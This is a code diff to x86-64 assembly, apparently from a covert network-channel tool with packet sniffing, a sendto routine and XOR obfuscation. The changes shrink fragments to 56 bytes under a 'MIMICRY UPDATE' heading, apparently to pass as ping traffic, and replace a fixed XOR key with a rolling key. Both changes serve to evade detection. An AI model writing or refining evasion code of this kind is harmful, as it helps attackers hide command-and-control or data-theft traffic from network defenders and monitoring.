@@ -239,7 +239,7 @@ _contiune:
     syscall                 
 
     ; --- [MIMICRY UPDATE] FRAGMENTATION (CHUNKING) LOGIC ---
-    cmp r14, 1000           ; Check if fragment is full (1000 bytes max)
+    cmp r14, 56           ; Check if fragment is full (56 bytes max)
     je _sniff_chunk         ; If yes, enter Chunking Receiver mode
     jmp _end_stream         ; If no, EOT (End of Transmission) reached
 
@@ -301,7 +301,7 @@ _sniff_chunk:
     syscall
 
     ; --- STREAM FLOW CONTROL ---
-    cmp r14, 1000              ; Check if more fragments are expected
+    cmp r14, 56              ; Check if more fragments are expected
     je _sniff_chunk            
     
     jmp _end_stream            
@@ -368,14 +368,18 @@ _sendto:
 
 ; --- UTILITY: XOR OBFUSCATION ---
 _xor_cipher:
-    test rcx, rcx               
-    jz .done                    
+    test rcx, rcx                   
+    jz .done                        
     push rsi                        
+    push rdx                        ; DL kullanacağımız için RDX'i koruyalım
+    mov dl, 0x42                    ; Başlangıç anahtarı (Seed)
 .loop:
-    xor byte [rsi], 0x42        ; Symmetric XOR key: 0x42
-    inc rsi                     
-    loop .loop                  
-    pop rsi                     
+    xor byte [rsi], dl              ; Baytı mevcut anahtarla XOR'la
+    add dl, 0x07                    ; Her adımda anahtarı 7 artır (Rolling etkisi)
+    inc rsi                         
+    loop .loop                      
+    pop rdx                         
+    pop rsi                         
 .done:
     ret
 
